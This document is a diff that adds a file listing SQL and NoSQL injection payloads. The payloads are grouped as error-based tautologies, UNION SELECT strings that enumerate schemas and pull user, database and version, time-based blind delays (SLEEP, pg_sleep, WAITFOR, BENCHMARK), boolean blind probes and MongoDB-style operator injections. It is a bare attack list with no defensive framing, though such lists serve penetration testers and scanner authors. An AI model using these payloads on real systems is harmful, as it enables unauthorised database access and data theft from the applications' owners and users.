@@ -1,0 +1,36 @@
+# SQL Injection Payloads
+# Error-based payloads
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+" OR "1"="1
+') OR ('1'='1
+") OR ("1"="1
+' OR 1=1#
+" OR 1=1#
+
+# Union-based payloads
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT schema_name FROM information_schema.schemata--
+
+# Time-based blind payloads
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+'; WAITFOR DELAY '0:0:5'--
+' OR BENCHMARK(5000000,MD5(1))--
+
+# Boolean-based blind payloads
+' AND 1=1--
+' AND 1=2--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' AND LENGTH(database())>0--
+
+# NoSQL injection payloads
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+'; return true; var x='
+'||'1'=='1
